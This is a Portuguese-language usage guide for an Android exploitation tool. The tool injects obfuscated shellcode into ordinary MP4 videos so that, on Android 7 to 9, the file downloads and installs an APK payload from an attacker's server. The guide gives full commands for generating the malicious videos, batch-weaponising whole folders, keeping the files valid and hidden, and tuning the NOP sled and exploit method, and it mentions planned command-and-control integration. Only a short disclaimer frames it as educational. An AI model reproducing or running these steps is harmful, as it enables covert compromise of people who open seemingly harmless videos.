# Guia de Uso - Ferramenta de Exploração Android

## Instalação

### Pré-requisitos
- Python 3.8+
- pip (gerenciador de pacotes Python)

### Setup

```bash
# Clonar ou extrair o repositório
cd android-exploit-tooling

# Instalar dependências
pip install -r requirements.txt

# Tornar executável (Linux/Mac)
chmod +x main.py cli_interface.py
```

## Uso Básico

### 1. Modo Interativo (Recomendado para Iniciantes)

```bash
python main.py --interactive
```

O programa solicitará:
- Caminho do arquivo MP4
- URL do servidor (para download do payload)
- Versão do Android alvo
- Método de exploração
- Se deve ofuscar o shellcode
- Caminho do arquivo de saída

### 2. Modo Linha de Comando

#### Gerar MP4 Malicioso Completo

```bash
python main.py \
  --mp4 video.mp4 \
  --url http://192.168.1.100:8080/payload.apk \
  --android 9 \
  --method uaf \
  --obfuscate \
  --output malicious.mp4
```

#### Apenas Gerar Payload (sem injetar em MP4)

```bash
python main.py \
  --generate-payload \
  --url http://server.com/payload.apk \
  --android 9 \
  --obfuscate
```

Isso salvará o payload em `payload.bin`.

#### Especificar Versão do Android

```bash
python main.py --mp4 video.mp4 --url http://server.com/apk --android 8.1
```

Versões suportadas: `7`, `8`, `8.1`, `9`

#### Escolher Método de Exploração

```bash
python main.py --mp4 video.mp4 --url http://server.com/apk --method rop
```

Métodos disponíveis:
- `uaf` - Use-After-Free (padrão, mais estável)
- `rop` - Return-Oriented Programming (mais complexo)
- `hybrid` - Combinação de UAF + ROP

#### Modo Dry-Run (Simular sem Salvar)

```bash
python main.py --mp4 video.mp4 --url http://server.com/apk --dry-run
```

#### Modo Verbose (Debug)

```bash
python main.py --mp4 video.mp4 --url http://server.com/apk --verbose
```

## Exemplos Práticos

### Exemplo 1: Exploração Básica

```bash
# Arquivo MP4 legítimo
ls -lh video.mp4
# -rw-r--r-- 1 user user 5.2M video.mp4

# Gerar MP4 malicioso
python main.py \
  --mp4 video.mp4 \
  --url http://192.168.1.100:8080/payload.apk \
  --android 9

# Resultado
ls -lh output_malicious.mp4
# -rw-r--r-- 1 user user 5.3M output_malicious.mp4
```

### Exemplo 2: Batch Processing (Múltiplos Arquivos)

```bash
# Criar script para processar múltiplos MP4s
for video in videos/*.mp4; do
  python main.py \
    --mp4 "$video" \
    --url http://server.com/payload.apk \
    --android 9 \
    --output "output/$(basename $video)"
done
```

### Exemplo 3: Teste com Android 7.0

```bash
python main.py \
  --mp4 video.mp4 \
  --url http://192.168.1.100:8080/payload.apk \
  --android 7 \
  --method uaf \
  --obfuscate
```

### Exemplo 4: Apenas Gerar Payload

```bash
python main.py \
  --generate-payload \
  --url http://192.168.1.100:8080/payload.apk \
  --android 9 \
  --obfuscate

# Salva em payload.bin
file payload.bin
# payload.bin: data
```

## Estrutura de Saída

Após executar a ferramenta, você terá:

```
.
├── output_malicious.mp4      # Arquivo MP4 com payload injetado
├── payload.bin               # Payload bruto (se gerado)
└── logs/
    └── exploit_TIMESTAMP.log # Log de execução
```

## Configuração Avançada

### Editar config.json

O arquivo `config.json` contém configurações padrão:

```json
{
  "default_settings": {
    "android_version": "9",
    "exploit_method": "uaf",
    "obfuscate": true,
    "output_directory": "./output"
  },
  "payload_settings": {
    "nop_sled_size": 512,
    "shellcode_obfuscation": "xor",
    "dummy_instructions": true,
    "dummy_frequency": 0.5
  },
  "mp4_settings": {
    "injection_point": "after_metadata",
    "preserve_validity": true,
    "add_free_atoms": true,
    "obfuscate_structure": true
  }
}
```

### Customizar Tamanho do NOP Sled

Editar em `payload_generator.py`:

```python
def add_nop_sled(self, size: int = 512) -> bytes:
    # Aumentar para 1024 para maior tolerância
```

### Customizar URL de Download

A URL é passada via `--url`:

```bash
python main.py --mp4 video.mp4 --url http://seu-servidor.com/payload.apk
```

## Troubleshooting

### Erro: "Arquivo MP4 não encontrado"

```bash
# Verificar se o arquivo existe
ls -l video.mp4

# Usar caminho absoluto
python main.py --mp4 /home/user/videos/video.mp4 --url http://server.com/apk
```

### Erro: "URL é obrigatória"

```bash
# Sempre especificar --url
python main.py --mp4 video.mp4 --url http://server.com/payload.apk
```

### Arquivo MP4 de Saída Corrompido

```bash
# Usar --preserve-validity (ativado por padrão)
# Se ainda assim falhar, tentar com --dry-run para debug
python main.py --mp4 video.mp4 --url http://server.com/apk --dry-run --verbose
```

### Payload Muito Grande

```bash
# Reduzir tamanho do NOP sled em payload_generator.py
# Ou usar método ROP que é mais compacto
python main.py --mp4 video.mp4 --url http://server.com/apk --method rop
```

## Saída Esperada

```
============================================================
        Ferramenta de Exploração Android
============================================================

[*] Gerando payload para Android 9...
[+] Payload gerado: 2048 bytes
[*] Carregando arquivo MP4: video.mp4...
[*] Parseando estrutura MP4...
[+] 5 atoms encontrados
[*] Injetando payload...
[+] Payload injetado em offset: 0x1a2c
[+] Tamanho do atom: 2056 bytes
[*] Verificando validade do MP4...
[+] Arquivo MP4 é válido
[*] Ofuscando estrutura MP4...
[+] Atom 'free' adicional injetado em 0x1234
[*] Salvando arquivo: output_malicious.mp4...
[+] Arquivo salvo: output_malicious.mp4
[+] Tamanho: 5.3M bytes
[+] Arquivo malicioso criado: output_malicious.mp4

============================================================
```

## Segurança e Disclaimer

Esta ferramenta é fornecida **exclusivamente para fins educacionais e de pesquisa em segurança**. O uso para fins maliciosos é **ilegal** e **antiético**.

- Usar apenas em ambientes controlados e com autorização
- Testar apenas em dispositivos de propriedade pessoal
- Não distribuir payloads sem consentimento
- Cumprir todas as leis aplicáveis

## Suporte

Para problemas ou dúvidas:

1. Verificar logs em `logs/`
2. Usar `--verbose` para mais detalhes
3. Consultar `ARCHITECTURE.md` para entender o fluxo
4. Revisar `TECHNICAL.md` para detalhes técnicos

## Próximas Versões

Planejado:
- Interface GUI (PyQt5)
- Suporte a Android 10+
- Métodos de exploração adicionais
- Ofuscação avançada
- Integração com C&C
